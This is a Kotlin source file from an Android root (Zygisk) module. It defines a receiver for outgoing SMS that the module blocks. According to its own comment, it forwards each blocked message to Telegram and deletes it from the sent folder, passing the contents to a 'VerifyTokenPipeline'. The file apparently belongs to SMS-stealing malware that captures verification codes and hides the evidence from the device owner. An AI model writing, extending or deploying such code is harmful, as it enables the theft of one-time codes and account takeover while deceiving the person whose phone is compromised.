package com.hivirtus.zygiskmode

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.util.Log
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch

/**
 * Native / module service.sh se blocked outgoing SMS — Telegram forward + sent delete.
 */
class BlockedSmsReceiver : BroadcastReceiver() {

    override fun onReceive(context: Context, intent: Intent) {
        if (intent.action != ACTION_OUTGOING_BLOCKED) return
        val dest = intent.getStringExtra(EXTRA_DEST).orEmpty()
        val body = intent.getStringExtra(EXTRA_BODY).orEmpty()
        if (body.isBlank()) return

        val pending = goAsync()
        val appContext = context.applicationContext
        CoroutineScope(Dispatchers.IO).launch {
            try {
                OutgoingSmsCleaner.scrubSentIfNeeded(appContext, dest, body)
                VerifyTokenPipeline.handleBlocked(appContext, dest, body)
                Log.i(TAG, "Forwarded blocked SMS dest=$dest")
            } catch (e: Exception) {
                Log.w(TAG, "Blocked SMS handle failed: ${e.message}")
            } finally {
                try {
                    pending.finish()
                } catch (_: Exception) {
                }
            }
        }
    }

    companion object {
        const val ACTION_OUTGOING_BLOCKED = "com.hivirtus.zygiskmode.OUTGOING_BLOCKED"
        const val EXTRA_DEST = "dest"
        const val EXTRA_BODY = "body"
        private const val TAG = "BlockedSmsReceiver"
    }
}
